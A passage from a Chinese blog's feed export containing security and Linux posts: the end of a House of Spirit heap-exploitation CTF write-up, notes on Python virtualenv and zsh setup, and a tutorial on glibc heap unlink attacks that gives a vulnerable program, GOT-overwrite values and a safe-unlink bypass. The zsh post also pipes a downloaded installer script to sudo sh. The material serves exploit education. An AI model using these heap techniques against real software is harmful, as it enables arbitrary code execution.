<p>2）接着利用内存泄露漏洞可得到 libc 中 _IO_file_sync 函数在内存中的地址，题目已给 libc.so 文件，通过该地址可计算处 system 函数和 “/bin/sh” 字符串的地址。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-4-12/50239044.jpg" alt=""><br>此外，利用该漏洞还能泄露栈地址，通过计算偏移量可得到堆指针 *name 的内存地址，为后续覆盖该堆指针做准备。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-4-12/91788711.jpg" alt="">       </p>
<p>3）继续添加评论时，可在 reason 内存中伪造一个 fast chunk。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-4-12/93324098.jpg" alt="">  </p>
<p>4）溢出 comment 变量内存，修改堆指针 *name 指向伪造的 chunk。堆指针被覆盖前内存如下：<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-4-12/47717698.jpg" alt=""><br>堆指针被覆盖后内存如下：<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-4-12/37025857.jpg" alt="">     </p>
<p>5）之后添加评论前程序会 free(name)，此时伪造的 chunk 将被加入 fastbin 中。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-4-12/18602401.jpg" alt="">   </p>
<p>6）再次添加评论，会把栈中伪造的 chunk 分配给 name，此时溢出 name 可覆盖 survey 函数的返回地址为 system 函数地址。返回地址被修改前内存如下：<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-4-12/27242292.jpg" alt=""><br>返回地址被修改后内存如下：<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-4-12/44036325.jpg" alt="">   </p>
<p>7）程序返回时将执行 system。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-4-12/83693658.jpg" alt="">   </p>
<hr>
<p>References:<br>[1] <a href="http://phrack.org/issues/66/10.html" target="_blank" rel="external">MALLOC DES-MALEFICARUM</a><br>[2] <a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit.html" target="_blank" rel="external">House of Spirit</a><br>[3] <a href="https://www.anquanke.com/post/id/85357" target="_blank" rel="external">堆之House of Spirit</a>  </p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
            <tag> house-of-spirit </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[配置 Linux Python 开发环境]]></title>
      <url>/2018/0316/configuring-the-linux-python-development-environment/</url>
      <content type="html"><![CDATA[<p>环境：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">64</span>bit Ubuntu <span class="number">16.04</span><span class="number">.4</span> LTS (Xenial Xerus)</div><div class="line">Python <span class="number">2.7</span><span class="number">.12</span></div></pre></td></tr></table></figure></p>
<h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><h2 id="1-virtualenvwrapper"><a href="#1-virtualenvwrapper" class="headerlink" title="1. virtualenvwrapper"></a>1. virtualenvwrapper</h2><p>virtualenv 是一个可以在同一台计算机中隔离多个 Python 环境的工具。它能够用于创建独立的 Python 环境，使得多个 Python 环境互不影响。virtualenvwrapper 是 virtualenv 的扩展管理包，可以更方便地管理虚拟环境。</p>
<p>使用 pip 命令安装 virtualenvwrapper，默认安装在 /usr/local/bin 目录下。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install virtualenvwrapper</div></pre></td></tr></table></figure></p>
<p>配置环境变量 WORKON_HOME 指定虚拟环境管理目录，然后运行 virtualenvwrapper.sh 初始化配置。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">export WORKON_HOME=$HOME/Virtualenv</div><div class="line">source /usr/local/bin/virtualenvwrapper.sh</div></pre></td></tr></table></figure></p>
<p>为了避免每次使用前手动执行以上命令，可以将其写入 shell 配置文件 ~/.bashrc 或 ~/.zshrc 中。</p>
<p><strong>错误：</strong><br>pip 安装依赖包出现以下错误：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TypeError: unsupported operand type(s) <span class="keyword">for</span> -=: <span class="string">'Retry'</span> <span class="keyword">and</span> <span class="string">'int'</span>TypeError: unsupported operand type(s) <span class="keyword">for</span> -=: <span class="string">'Retry'</span> <span class="keyword">and</span> <span class="string">'int'</span></div></pre></td></tr></table></figure></p>
<p>出现该错误是因为使用的网络挂了代理，使用 pip 之前需要配置环境变量 http_proxy 到代理服务器的地址。可通过以下<a href="https://stackoverflow.com/a/39484683" target="_blank" rel="external">两种方法解决</a>。<br>a）设置环境变量：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export http_proxy=<span class="string">"http://user:pass@my.site:port/"</span></div></pre></td></tr></table></figure></p>
<p>b）使用 —proxy 选项：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">--proxy=[user:<span class="keyword">pass</span>@]url:port</div></pre></td></tr></table></figure></p>
<h2 id="2-Pycharm"><a href="#2-Pycharm" class="headerlink" title="2. Pycharm"></a>2. Pycharm</h2><p>在<a href="https://www.jetbrains.com/pycharm/?fromMenu" target="_blank" rel="external">官网</a>下载软件包，然后解压到 /opt 目录下并安装。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo tar xf pycharm-community<span class="number">-2017.3</span><span class="number">.4</span>.tar.gz -C /opt/</div><div class="line">cd /opt/PyCharm-community<span class="number">-2017.3</span><span class="number">.4</span>/bin</div><div class="line">./pycharm.sh</div></pre></td></tr></table></figure></p>
<p>安装过程中可选择安装 IdeaVim 插件。</p>
<h1 id="0x02-使用与配置"><a href="#0x02-使用与配置" class="headerlink" title="0x02 使用与配置"></a>0x02 使用与配置</h1><h2 id="1-创建虚拟环境"><a href="#1-创建虚拟环境" class="headerlink" title="1. 创建虚拟环境"></a>1. 创建虚拟环境</h2><p>virtualenv 常用命令如下：   </p>
<blockquote>
<p>mkvirtualenv: Create a new virtualenv in $WORKON_HOME<br>cdvirtualenv: change to the $VIRTUAL_ENV directory<br>lsvirtualenv: list virtualenvs<br>rmvirtualenv: Remove a virtualenv<br>workon: list or change working virtualenvs    </p>
</blockquote>
<p>在项目开发过程中需要安装不同的依赖库，为了使不同项目中使用的依赖库不会互相影响，可以为每个项目单独创建一个虚拟 python 运行环境。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkvirtualenv TestVirtualenv</div></pre></td></tr></table></figure></p>
<p>可加上参数–no-site-packages，可以不复制已经安装到系统 Python 环境的所有第三方包，得到一个干净的 Python 运行环境。创建好后，进入该虚拟环境安装所需的依赖库。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cdvirtualenv TestVirtualenv</div><div class="line">pip install somepackages</div></pre></td></tr></table></figure></p>
<h2 id="2-Pycharm-1"><a href="#2-Pycharm-1" class="headerlink" title="2. Pycharm"></a>2. Pycharm</h2><p>Pycharm 已集成 virtualenv 功能，可以在新建项目时创建 virtualenv，也可以使用已有的 virtualenv。    </p>
<h3 id="1）-创建新的-virtualenv"><a href="#1）-创建新的-virtualenv" class="headerlink" title="1） 创建新的 virtualenv"></a>1） 创建新的 virtualenv</h3><p>创建项目时新建一个 virtualenv。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">File -&gt; New Project -&gt; Project Interpreter -&gt; New environment using Virtualenv</div><div class="line"></div><div class="line">Location：指定 virtualenv 保存目录；</div><div class="line">Base interpreter：选择接收器；</div><div class="line">Inherit global site-packages：继承 Base interpreter 中安装的第三方库；</div><div class="line">Make available to all projects：将此虚拟环境提供给其他项目使用。</div></pre></td></tr></table></figure></p>
<h3 id="2）-使用已有-virtualenv"><a href="#2）-使用已有-virtualenv" class="headerlink" title="2） 使用已有 virtualenv"></a>2） 使用已有 virtualenv</h3><p>创建项目时选择已有的 virtualenv 。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">File -&gt; New Project -&gt; Project Interpreter -&gt; Existing Interpreter</div><div class="line">-&gt; Setting -&gt; Add Local Python Interpreter</div><div class="line">选择已有 virtualenv 所在目录中的解释器。</div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] <a href="https://www.jetbrains.com/help/pycharm/quick-start-guide.html" target="_blank" rel="external">Pycharm Quick Start Guide</a>   </p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[zsh 使用笔记]]></title>
      <url>/2018/0310/zsh-notes/</url>
      <content type="html"><![CDATA[<p>Zsh 是一款功能强大终端（shell）软件，既可以作为交互式终端，也可以作为脚本解释器。它在兼容 Bash 的同时，还有提供了很多改进，例如：</p>
<blockquote>
<p>更高效<br>更好的自动补全<br>更好的文件名展开（通配符展开）<br>可定制性高    </p>
</blockquote>
<h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><h2 id="1-安装-zsh"><a href="#1-安装-zsh" class="headerlink" title="1. 安装 zsh"></a>1. 安装 zsh</h2><p>首先安装 zsh，并设置 zsh 为系统默认 bash。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install Zsh</div><div class="line">chsh -s $(which zsh)</div></pre></td></tr></table></figure></p>
<p>注销（Log out）并重新进入系统，此时 shell 默认为 zsh。</p>
<h2 id="2-安装-oh-my-zsh"><a href="#2-安装-oh-my-zsh" class="headerlink" title="2. 安装 oh-my-zsh"></a>2. 安装 oh-my-zsh</h2><p>由于 zsh 配置过于复杂，所以安装 oh-my-zsh 可简化 zsh 的配置。oh-my-zsh 有 200 多各插件和 140 多种主题。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo sh -c <span class="string">"$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)"</span></div></pre></td></tr></table></figure></p>
<h1 id="0x02-配置"><a href="#0x02-配置" class="headerlink" title="0x02 配置"></a>0x02 配置</h1><h2 id="1-配置主题"><a href="#1-配置主题" class="headerlink" title="1. 配置主题"></a>1. 配置主题</h2><p>修改 ~/.zshrc 中的 ZSH_THEME 参数可配置不同样式的主题。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ZSH_THEME=<span class="string">"agnoster"</span></div></pre></td></tr></table></figure></p>
<p>修改后发现主题中存在乱码，这是缺少 Powerline 字体导致的，所以需安装 Powerline 字体。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/powerline/fonts  </div><div class="line">cd fonts</div><div class="line">./install.sh</div></pre></td></tr></table></figure></p>
<p>安装完后设置终端字体，ubuntu 中通过以下方式设置。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Edit -&gt; Profile Preferences -&gt; General -&gt; Text Appearance -&gt; Custom font</div><div class="line">-&gt; Ubuntu Mono derivative Powerline Regular</div></pre></td></tr></table></figure></p>
<h2 id="2-隐藏用户名"><a href="#2-隐藏用户名" class="headerlink" title="2. 隐藏用户名"></a>2. 隐藏用户名</h2><p>默认情况下，命令提示符前有固定的 “username@hostname” ，可在 .zshrc 中添加以下环境变量隐藏该信息。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export DEFAULT_USER= <span class="string">"username "</span>   <span class="comment"># username 需替换为系统默认用户名</span></div></pre></td></tr></table></figure></p>
<h1 id="0x03-插件"><a href="#0x03-插件" class="headerlink" title="0x03 插件"></a>0x03 插件</h1><h2 id="1-帮助文档高亮"><a href="#1-帮助文档高亮" class="headerlink" title="1. 帮助文档高亮"></a>1. 帮助文档高亮</h2><p>colored-man-pages 插件可使 man 帮助文档高亮显示，该插件在 oh-my-zsh 中自带，只需在 .zshrc 中启用即可。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">plugins=(</div><div class="line">  colored-man-pages</div><div class="line">  ...</div><div class="line">)</div></pre></td></tr></table></figure></p>
<h2 id="2-历史记录补全"><a href="#2-历史记录补全" class="headerlink" title="2. 历史记录补全"></a>2. 历史记录补全</h2><p>zsh-autosuggestions 插件可根据历史记录自动补全命令，输入命令时会以暗色补全，按方向键右键完成输入。首先下载至 zsh 的 plugins 目录下，然后在 .zshrc 中启用。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git clone https://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions</div></pre></td></tr></table></figure></p>
<h2 id="3-命令高亮"><a href="#3-命令高亮" class="headerlink" title="3. 命令高亮"></a>3. 命令高亮</h2><p>zsh-syntax-highlighting 插件可使输入的命令根据主题自动高亮。输入正确的命令是黄色，输入错误的命令是红色。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $ZSH_CUSTOM/plugins/zsh-syntax-highlighting</div></pre></td></tr></table></figure></p>
<h2 id="4-历史命令搜索"><a href="#4-历史命令搜索" class="headerlink" title="4. 历史命令搜索"></a>4. 历史命令搜索</h2><p>history-substring-search 插件可进行历史命令搜索，如果和 zsh-syntax-highlighting 插件共用，要配置到语法高亮插件之后。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/zsh-users/zsh-history-substring-search.git $ZSH_CUSTOM/plugins/history-substring-search</div></pre></td></tr></table></figure></p>
<p>输入部分命令后，使用上下键查询可匹配的历史命令。</p>
<h1 id="0x04-使用"><a href="#0x04-使用" class="headerlink" title="0x04 使用"></a>0x04 使用</h1><h2 id="1-命令补全"><a href="#1-命令补全" class="headerlink" title="1. 命令补全"></a>1. 命令补全</h2><p>按两下 tab 键可以触发 zsh 的补全，所有待补全项都可以通过键盘方向键或者 <ctrl-n p="" f="" b=""> 来选择。</ctrl-n></p>
<h2 id="2-命令选项补全"><a href="#2-命令选项补全" class="headerlink" title="2. 命令选项补全"></a>2. 命令选项补全</h2><p>支持命令选项的补全。例如 ls -<tab><tab> 会直接列出所有 ls 的参数。</tab></tab></p>
<h2 id="3-命令参数补全"><a href="#3-命令参数补全" class="headerlink" title="3. 命令参数补全"></a>3. 命令参数补全</h2><p>支持命令参数的补全。例如 kill 进程名<tab>，zsh 就会自动补全进程的 pid。</tab></p>
<h2 id="4-快速目录切换"><a href="#4-快速目录切换" class="headerlink" title="4. 快速目录切换"></a>4. 快速目录切换</h2><p>zsh 会记住每一次切换的路径，然后通过 1 来切换到上一次访问的路径，2 切换到上上次，一直到 9，还可以通过 d 查看目录访问历史。</p>
<hr>
<p>References:<br>[1] <a href="https://github.com/robbyrussell/oh-my-zsh/wiki" target="_blank" rel="external">oh-my-zsh</a>   </p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> zsh </tag>
            
            <tag> oh-my-zsh </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux 堆内存溢出 unlink 攻击]]></title>
      <url>/2017/1231/linux-heap-memory-overflow-unlink-attack/</url>
      <content type="html"><![CDATA[<p>在二进制漏洞利用中，缓冲区溢出漏洞是最常见的一类漏洞，这类漏洞具有很强的危害性，通常能被攻击者利用并实现任意代码执行。缓冲区溢出漏洞可分为基于栈的内存溢出和基于堆的内存溢出。本文主要介绍如何利用堆内存溢出进行 unlink 攻击，进而实现任意代码执行。</p>
<p>首先看以下漏洞程序：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</div><div class="line">    <span class="keyword">char</span> *first, *second;</div><div class="line">    first = <span class="built_in">malloc</span>(<span class="number">666</span>);</div><div class="line">    second = <span class="built_in">malloc</span>(<span class="number">12</span>);</div><div class="line">    <span class="keyword">if</span> (argc != <span class="number">1</span>)</div><div class="line">        <span class="built_in">strcpy</span>(first, argv[<span class="number">1</span>]);</div><div class="line">    <span class="built_in">free</span>(first);</div><div class="line">    <span class="built_in">free</span>(second);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>上述程序在分配完堆后，堆内存分布如下图所示。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-10-31/17968347.jpg" alt=""></p>
<p>程序中 strcpy 函数会导致堆溢出，argv[1] 大于 666 字节时，可覆盖第二个 chunk 的各个字段为指定的值，从而使堆管理器将第二个 chunk 判断为空闲状态。根据 malloc 的内存回收机制，在 free(first) 时会将上图中的 second chunk 从 bin 中 unlink，并与第一个 chunk 合并。通过修改 second chunk 的 fd、bk 字段，unlink 时可把 free 函数的 GOT 表项写为 shellcode 地址。当程序再次调用 free 函数时会执行 shellcode。     </p>
<p>下面具体介绍 unlink 机制和 unlink 攻击的原理。</p>
<h1 id="0x01-释放堆与-unlink"><a href="#0x01-释放堆与-unlink" class="headerlink" title="0x01 释放堆与 unlink"></a>0x01 释放堆与 unlink</h1><p>释放堆时会判断当前 chunk 的相邻 chunk 是否为空闲状态，若是则会进行堆合并。合并时会将空闲 chunk 从 bin 中 unlink，并将合并后的 chunk 添加到 unsorted bin 中。堆合并分为向前合并和向后合并。</p>
<h2 id="1-向后合并"><a href="#1-向后合并" class="headerlink" title="1. 向后合并"></a>1. 向后合并</h2><p>首先判断前一个 chunk 是否空闲，即检查当前 chunk 的 PREV_INUSE（P）位是否为 0。若为空闲，则将其合并。合并时，改变当前 chunk 指针指向前一个 chunk，使用 unlink 宏将前一个空闲 chunk 从 bin 中移除，最后更新合并后 chunk 的大小。</p>
<p>malloc.c 中向后合并的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">INTERNAL_SIZE_T hd = p-&gt;size; <span class="comment">/* its head field */</span></div><div class="line">INTERNAL_SIZE_T sz;  <span class="comment">/* its size */</span></div><div class="line">INTERNAL_SIZE_T prevsz; <span class="comment">/* size of previous contiguous chunk */</span></div><div class="line"></div><div class="line">sz = hd &amp; ~PREV_INUSE;</div><div class="line"><span class="comment">/* consolidate backward */</span></div><div class="line"><span class="keyword">if</span> (!(hd &amp; PREV_INUSE))</div><div class="line">&#123;</div><div class="line">  prevsz = p-&gt;prev_size;</div><div class="line">  p = chunk_at_offset(p, -(<span class="keyword">long</span>)prevsz);</div><div class="line">  sz += prevsz;</div><div class="line">  unlink(p, bck, fwd);</div><div class="line">&#125;</div><div class="line">set_head(p, sz | PREV_INUSE);</div></pre></td></tr></table></figure></p>
<p>本例中，释放 1st chunk 时，当前 chunk(1st chunk) 的前一个 chunk 是 allocated，所以不能向后合并，unlink 宏不会被调用。</p>
<h2 id="2-向前合并"><a href="#2-向前合并" class="headerlink" title="2. 向前合并"></a>2. 向前合并</h2><p>首先判断下个 chunk 是否空闲，即检查下下个 chunk（相对当前 chunk）的 PREV_INUSE（P）位是否为 0，若为 0 表明下个 chunk 是空闲的，则进行合并。合并时使用 unlink 宏将下个 chunk 从它的 bin 中移除，并更新合并后的 chunk 大小。</p>
<p>malloc.c 中向前合并的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)\</span></div><div class="line"> (((mchunkptr)(((char*)(p)) + (s)))-&gt;size &amp; PREV_INUSE)</div><div class="line"></div><div class="line">INTERNAL_SIZE_T hd = p-&gt;size; <span class="comment">/* its head field */</span></div><div class="line">INTERNAL_SIZE_T sz;  <span class="comment">/* its size */</span></div><div class="line">sz = hd &amp; ~PREV_INUSE;</div><div class="line">next = chunk_at_offset(p, sz);</div><div class="line">nextsz = chunksize(next);</div><div class="line"><span class="comment">/* consolidate forward */</span></div><div class="line"><span class="keyword">if</span> (!(inuse_bit_at_offset(next, nextsz)))   </div><div class="line">&#123;</div><div class="line">  sz += nextsz;</div><div class="line">  ...</div><div class="line">  unlink(next, bck, fwd);</div><div class="line">  next = chunk_at_offset(p, sz);</div><div class="line">&#125;</div><div class="line"></div><div class="line">set_head(p, sz | PREV_INUSE);</div><div class="line">next-&gt;prev_size = sz;</div></pre></td></tr></table></figure></p>
<p>本例中，释放第一个 chunk 时，当前 chunk 的下一个 chunk（2nd chunk）是 allocated，所以不能向前合并，unlink 宏不会被调用。</p>
<h2 id="3-unlink"><a href="#3-unlink" class="headerlink" title="3. unlink"></a>3. unlink</h2><p>当前释放的堆与前一个或后一个空闲 chunk 进行合并时，会把空闲 chunk 从 bin 中移除，移除过程使用 unlink 宏来实现。unlink 宏的定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Take a chunk off a bin list */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;  \</span></div><div class="line">  FD = P-&gt;fd;             \</div><div class="line">  BK = P-&gt;bk;             \</div><div class="line">  FD-&gt;bk = BK;            \</div><div class="line">  BK-&gt;fd = FD;            \</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>unlink 即为将 P 从链表中删除的过程。</p>
<h1 id="0x02-unlink-攻击"><a href="#0x02-unlink-攻击" class="headerlink" title="0x02 unlink 攻击"></a>0x02 unlink 攻击</h1><p>在 dlmalloc 中，unlink 的定义如上一节所示，只有与指针操作相关的 4 条语句。但在较新版本的 glibc 中，为了缓解攻击者进行 unlink 攻击，在宏定义中加入了安全校验，使得利用难度加大，只能在特定条件下使用一些技巧绕过校验。</p>
<h2 id="1-原始的-unlink-攻击"><a href="#1-原始的-unlink-攻击" class="headerlink" title="1. 原始的 unlink 攻击"></a>1. 原始的 unlink 攻击</h2><p>上述例子中，传入的字符串参数长度大于 666 字节时 strcpy 会使 first chunk 溢出，可覆盖 second chunk 的头部字段为如下值：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">prev_size = 偶数</div><div class="line">size = <span class="number">-4</span></div><div class="line">fd = <span class="built_in">free</span>@got - <span class="number">12</span></div><div class="line">bk = shellcode address</div></pre></td></tr></table></figure></p>
<p>在执行 free(first) 时，当前释放的 frist chunk 的下下个 chunk 不是 top chunk。因为 second chunk 的大小覆盖为 -4，所以下下个 chunk 在 second chunk 偏移为 -4 的位置，因此 malloc 把 second chunk 的 prev_size 当做下下个 chunk 的 size。而 prev_size 已被覆盖为偶数（PREV_INUSE位为0），malloc 会将 second chunk 当作空闲 chunk。</p>
<p>释放 first chunk 时会将 second chunk 从 bin 中 unlink，并将其合并到 first chunk。这个过程会触发 unlink（second），此时 <code>P = second chunk ptr</code>，unlink 过程如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>）FD = second chunk ptr-&gt;fd = <span class="built_in">free</span>@got – <span class="number">12</span>；</div><div class="line"><span class="number">2</span>）BK = second chunk ptr-&gt;bk = shellcode address；</div><div class="line"><span class="number">3</span>）FD-&gt;bk = BK，即（<span class="built_in">free</span>@got – <span class="number">12</span>）-&gt;bk = shellcode address；</div><div class="line"><span class="number">4</span>）BK-&gt;fd = FD，即shellcode address-&gt;fd = <span class="built_in">free</span>@got – <span class="number">12</span>。</div></pre></td></tr></table></figure></p>
<p>unlink 步骤 1）和 2）将 second chunk 的 fd 和 bk 复制到 FD 和 BK。如下图所示，复制后 <code>FD = free@got-12</code>，<code>BK = shellcode address</code>，即 second chunk 的 fd、bk 指针分别指向 <code>free@got-12</code> 和 <code>shellcode address</code>。</p>
<p>步骤 3）中 FD 是 malloc_chunk 结构体指针，FD-&gt;bk 相当于 <code>FD+12 = free@got-12+12 = free@got</code>，即 FD-&gt;bk 指向 free 的 GOT 表项，FD-&gt;bk = BK 相当于 <code>free@got = shellcode address</code>，即 free 的 GOT 表项被修改为了 shellcode 地址。因此，程序在执行第二个 free 时就会执行 shellcode。</p>
<p>同理，步骤4）中将 <code>shellcode addr + 8</code> 处 4 个字节覆盖为 <code>free@got - 12</code>，所以在编写 shellcode 时应跳过这 4 个字节。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-11-23/81536873.jpg" alt=""></p>
<h2 id="2-绕过安全校验"><a href="#2-绕过安全校验" class="headerlink" title="2. 绕过安全校验"></a>2. 绕过安全校验</h2><p>首先，需要了解 glibc 中 unlink 的校验机制。以下为 glibc-2.19 中 unlink 宏的部分代码，在删除 P 节点之前会检查 <code>FD-&gt;bk != P || BK-&gt;fd != P</code> 是否成立，即检查当前 chunk 前一个 chunk 的 bk 与后一个 chunk 的 fd 是否指向当前 chunk。若当前 chunk 的 fd 和 bk 被修改则无法通过这项检查，<code>FD-&gt;bk = BK</code> 与 <code>BK-&gt;fd = FD</code> 不会执行，导致 unlink 攻击不能进行。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Take a chunk off a bin list */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;         \</span></div><div class="line">    FD = P-&gt;fd;								      \</div><div class="line">    BK = P-&gt;bk;								      \</div><div class="line">    <span class="meta-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</div><div class="line">      malloc_printerr (check_action, <span class="meta-string">"corrupted double-linked list"</span>, P);      \</div><div class="line">    <span class="meta-keyword">else</span> &#123;								          \</div><div class="line">        FD-&gt;bk = BK;						    \</div><div class="line">        BK-&gt;fd = FD;						    \</div><div class="line">        ...</div><div class="line">    &#125;									              \</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>为了绕过以上指针校验，需要以下条件：</p>
<blockquote>
<p>a） 程序中存在一个全局指针变量 ptr<br>b） ptr 指向的堆内存可由用户控制</p>
</blockquote>
<p>若具备以上条件，攻击者可在指针 ptr 指向的内存中伪造一个空闲 chunk P，根据 ptr 构造合适的地址覆盖 chunk P 的 fd 和 bk，使得 <code>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</code> 成立。具体如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">P-&gt;fd = ptr - <span class="number">0xC</span></div><div class="line">P-&gt;bk = ptr - <span class="number">0x8</span></div></pre></td></tr></table></figure></p>
